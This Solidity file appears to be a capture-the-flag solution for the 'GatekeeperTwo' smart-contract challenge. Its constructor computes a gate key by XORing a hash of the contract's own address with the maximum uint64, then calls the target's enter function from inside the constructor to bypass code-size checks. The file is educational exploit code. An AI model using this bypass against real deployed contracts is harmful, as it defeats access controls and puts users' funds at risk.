// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackerGatekeeperTwo {
    constructor(address targetAddress) {
        IGatekeeperTwo target = IGatekeeperTwo(targetAddress);
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        target.enter(gateKey);
    }
}